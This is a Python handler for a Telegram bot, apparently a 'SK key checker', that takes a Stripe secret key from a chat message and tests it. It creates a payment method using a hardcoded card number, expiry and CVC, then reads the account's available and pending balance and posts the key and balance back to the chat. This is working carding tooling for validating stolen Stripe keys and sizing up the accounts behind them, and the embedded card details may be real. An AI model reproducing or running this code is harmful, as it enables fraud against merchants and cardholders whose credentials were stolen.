import requests
import time

def process_sk_command(bot, message):
    chat_id = message.chat.id
    sk_key = message.text.split()[1]  # Extract the SK key from the message
    start_time = time.time()

    response = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        auth=(sk_key, ''),
        data={
            'type': 'card',
            'card[number]': '4102770015058552',
            'card[exp_month]': '06',
            'card[exp_year]': '24',
            'card[cvc]': '997'
        }
    )

    if response.status_code == 200 and ('declined' in response.text or 'pm_' in response.text):
        balance_response = requests.get(
            'https://api.stripe.com/v1/balance',
            headers={'Authorization': f'Bearer {sk_key}'}
        )
        balance_data = balance_response.json()
        balance = balance_data['available'][0]['amount']
        pending_balance = balance_data['pending'][0]['amount']
        currency = balance_data['available'][0]['currency']

        result_text = (
            f"↯ SK KEY CHECK 🌟\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"• LIVE SK ✅\n\n"
            f"• KEY: {sk_key}\n\n"
            f"• BALANCE: {balance}\n"
            f"• PENDING: {pending_balance}\n"
            f"• CURRENCY: {currency}\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"• Dev: @aftab_kabir\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
            f"▫️ Checked by: {message.from_user.username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－"
        )

    else:
        error_message = response.json().get('error', {}).get('message', 'Unknown error')
        result_text = (
            f"↯ SK KEY CHECK 🌟\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"• DEAD KEY ❌\n\n"
            f"• KEY: {sk_key}\n\n"
            f"• STATUS: {error_message}\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"• Dev: @aftab_kabir\n"
            f"－－－－－－－－－－－－－－－－\n"
            f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
            f"▫️ Checked by: {message.from_user.username}\n"
            f"⚡️ Bot by - AFTAB 👑\n"
            f"－－－－－－－－－－－－－－－－"
        )

    bot.send_message(chat_id, result_text, parse_mode='HTML')
